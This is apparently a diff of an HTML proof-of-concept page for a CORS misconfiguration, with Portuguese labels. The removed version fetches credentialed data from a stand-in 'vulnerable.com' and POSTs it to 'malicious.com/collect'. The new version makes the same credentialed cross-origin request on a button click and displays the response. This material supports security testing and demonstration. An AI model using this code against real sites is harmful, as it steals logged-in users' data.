@@ -1,23 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit CORS</title>
+    <title>PoC de CORS</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
+    <h1>PoC de CORS</h1>
+    <p>Esta página demonstra a vulnerabilidade CORS com origem arbitrária confiável.</p>
+    <p>Se você está vendo esta mensagem, a página de PoC do CORS está funcionando corretamente.</p>
+
+    <button onclick="validateCORS()">Verificar Vulnerabilidade</button>
+
+    <div class="status" id="status">
+        Status: Aguardando verificação...
+    </div>
+
     <script>
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://vulnerable.com/sensitive-data', true);
-        xhr.withCredentials = true;
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                // Enviar dados para o servidor controlado
-                var exfiltrate = new XMLHttpRequest();
-                exfiltrate.open('POST', 'http://malicious.com/collect', true);
-                exfiltrate.setRequestHeader('Content-Type', 'application/json');
-                exfiltrate.send(JSON.stringify({data: xhr.responseText}));
-            }
-        };
-        xhr.send();
+        function validateCORS() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://vulnerable.com/sensitive-data', true);
+            xhr.withCredentials = true;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4) {
+                    var statusDiv = document.getElementById('status');
+                    if (xhr.status == 200) {
+                        statusDiv.innerHTML = 'Status: Sucesso! Dados recebidos: ' + xhr.responseText;
+                        statusDiv.style.borderColor = 'green';
+                        statusDiv.style.backgroundColor = '#e0ffe0';
+                    } else {
+                        statusDiv.innerHTML = 'Status: Falha ao obter dados.';
+                        statusDiv.style.borderColor = 'red';
+                        statusDiv.style.backgroundColor = '#ffe0e0';
+                    }
+                }
+            };
+            xhr.send();
+        }
     </script>
 </body>
 </html>
+
